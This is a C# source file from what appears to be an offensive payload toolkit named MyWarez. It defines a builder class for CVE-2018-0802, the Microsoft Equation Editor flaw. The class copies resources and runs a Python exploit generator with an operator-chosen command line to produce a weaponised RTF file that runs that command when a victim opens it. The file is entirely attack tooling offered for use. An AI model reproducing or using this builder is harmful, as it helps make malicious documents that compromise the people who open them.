using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

using MyWarez.Core;

namespace MyWarez.Payloads
{
    public sealed class CVE_2018_0802 : Rtf
    {
        public CVE_2018_0802(IProcessList processList) : base(BuildRtf(processList))
        {
            if (processList.Processes.Count() != 1)
                throw new ArgumentException();
        }
        private static byte[] BuildRtf(IProcessList processList)
        {
            using (new TemporaryContext())
            {
                Utils.CopyFilesRecursively(SourceDirectory, ".");
                var proc2 = Process.Start(@"C:\Python27\python.exe", Exploit_generator_script + @" -c """ + processList.Processes.First().CmdLine.ToString() + @""" -o CVE_2018_0802.rtf");
                proc2.WaitForExit();
                var outputFileName = OutputFileName + ".rtf";
                return System.IO.File.ReadAllBytes(outputFileName);
            }
        }
        private static readonly string SourceDirectory = Path.Join(Core.Constants.PayloadsResourceDirectory, "Windows", "Execution", "ClientExploitation", typeof(CVE_2018_0802).Name);
        public static readonly string OutputFileName = new DirectoryInfo(SourceDirectory).Name;
        private static readonly string Exploit_generator_script = "RTF_11882_0802.py";
    }
}
